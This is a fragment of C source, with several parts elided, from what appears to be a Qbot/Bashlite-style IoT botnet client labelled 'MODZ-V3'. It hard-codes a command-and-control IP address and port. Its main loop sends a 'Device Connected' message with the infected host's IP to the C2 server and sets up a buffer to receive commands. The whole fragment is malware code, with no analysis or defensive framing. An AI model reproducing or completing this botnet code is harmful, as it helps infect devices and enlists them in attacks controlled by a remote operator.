...
#define VERSION "MODZ-V3"
#define ECHOBIN "qBoatt"
#define BINDIR ""
...
unsigned char *cncip = "209.97.138.82";
int cncport = 1233;
...
int main(int argc, unsigned char * argv[]) {
  ...
  while (1) {
    ...
    sockprintf(mainCommSock, "\x1b[1;33mDevice Connected -> [%s] [%s] \x1b[0m", (char *)inet_ntoa(ourIP), (char *)VERSION);
    char commBuf[4096];
    int got = 0;
    int i = 0;
